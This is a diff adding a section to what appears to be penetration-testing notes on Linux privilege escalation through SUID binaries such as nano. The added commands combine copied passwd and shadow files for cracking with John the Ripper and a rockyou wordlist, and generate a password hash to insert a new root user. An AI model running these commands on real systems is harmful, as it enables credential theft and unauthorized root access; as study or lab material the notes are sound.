@@ -18,3 +18,18 @@ find / -perm -u=s -type f 2>/dev/null # replace = to + is fine.
 
 Some famous Linux / Unix executable commands that can allow privilege escalation: bash, cat, cp, echo, find, less, more, nano, nmap, Vim and etc.
 
+## nano suid prevEsc
+Password cracking : 
+
+```bash
+unshadow passwd.txt shadow.txt > passwords.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+	#press enter to check the corrent status.
+```
+
+Add a root user :
+
+```bash
+openssl passwd -1 -salt HCX password
+```
